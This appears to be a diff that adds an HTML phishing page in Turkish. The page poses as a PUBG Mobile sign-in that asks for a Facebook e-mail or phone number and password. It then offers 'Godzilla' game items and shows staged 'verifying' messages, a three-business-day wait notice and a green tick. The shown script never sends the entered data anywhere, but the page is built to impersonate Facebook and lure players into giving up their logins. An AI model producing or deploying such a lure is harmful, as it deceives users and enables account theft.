@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>PUBG Mobile Giriş</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('pubg.jpg');
+      background-size: cover;
+      background-position: center;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.5);
+      backdrop-filter: blur(50px);
+      padding: 30px;
+      border-radius: 10px;
+      width: 350px;
+      box-shadow: 0 0 20px black;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container img {
+      width: 150px;
+      margin-bottom: 20px;
+      background-color: transparent;
+    }
+
+    h2 {
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 130%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-left: -30px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .image-selection {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      width: 100%;
+    }
+
+    .image-selection div {
+      margin: 0 10px;
+    }
+
+    .image-selection img {
+      width: 100%;
+      max-width: 200px;
+      cursor: pointer;
+      border-radius: 10px;
+      transition: transform 0.3s ease;
+      max-height: 300px;
+    }
+
+    .image-selection img:hover {
+      transform: scale(1.1);
+    }
+
+    .image-text {
+      text-align: center;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .message {
+      margin-top: 20px;
+      font-weight: bold;
+      display: none;
+      color: #333;
+    }
+
+    .green-check {
+      display: none;
+      font-size: 80px;
+      color: green;
+      font-weight: bold;
+      margin-top: 30px;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .fade-in {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container fade-in" id="loginContainer">
+  <img src="face.png" alt="Facebook Logo">
+  <h2>Facebook ile Giriş Yap</h2>
+  <form id="loginForm">
+    <input type="text" placeholder="Facebook e-posta veya telefon" required><br>
+    <input type="password" placeholder="Şifre" required><br>
+    <button type="submit">Giriş Yap</button>
+  </form>
+</div>
+
+<div class="container fade-in" id="imageSelectionContainer" style="display: none;">
+  <div class="image-selection" id="imageSelection">
+    <div>
+      <img src="beyaz.jpg" alt="Beyaz Godzilla" onclick="selectImage('white')">
+      <div class="image-text">BEYAZ GODZİLLA</div>
+    </div>
+    <div>
+      <img src="kırmızı.jpg" alt="Kırmızı Godzilla" onclick="selectImage('red')">
+      <div class="image-text">KIRMIZI GODZİLLA</div>
+    </div>
+  </div>
+  <div class="message" id="messageBox"></div>
+  <div class="green-check" id="greenCheck">✔</div>
+</div>
+
+<script>
+  const form = document.getElementById('loginForm');
+  const loginContainer = document.getElementById('loginContainer');
+  const imageSelectionContainer = document.getElementById('imageSelectionContainer');
+  const messageBox = document.getElementById('messageBox');
+  const greenCheck = document.getElementById('greenCheck');
+  const imageSelection = document.getElementById('imageSelection');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    loginContainer.style.display = 'none';
+    imageSelectionContainer.style.display = 'block';
+  });
+
+  function selectImage(imageType) {
+    // Seçim ekranını temizle
+    imageSelection.innerHTML = '';
+    
+    // Mesaj kutusunu göster
+    messageBox.style.display = 'block';
+    messageBox.innerText = 'Kontrol ediliyor...';
+
+    setTimeout(() => {
+      messageBox.innerText = 'Bilgiler kontrol edildi, lütfen bekleyiniz...';
+
+      setTimeout(() => {
+        messageBox.innerHTML = 'Lütfen 3 iş gününde mesaj kutunuzu kontrol ediniz.';
+
+        // Tik işareti sadece bu mesajdan sonra çıkacak
+        greenCheck.style.display = 'block';
+
+      }, 2000);
+    }, 2000);
+  }
+</script>
+
+</body>
+</html>
